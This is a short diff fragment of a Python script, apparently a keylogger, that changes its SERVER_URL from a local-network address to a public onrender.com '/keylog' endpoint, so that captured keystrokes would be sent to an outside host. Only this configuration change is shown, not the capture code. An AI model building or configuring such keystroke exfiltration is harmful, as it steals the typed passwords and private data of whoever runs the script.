@@ -3,7 +3,7 @@ import requests
 import ctypes
 import time
 
-SERVER_URL = 'http://192.168.127.1:5000/keylog'
+SERVER_URL = 'https://simple-readers-keystroke-from-another-3jj7.onrender.com/keylog'
 
 
 def get_char():
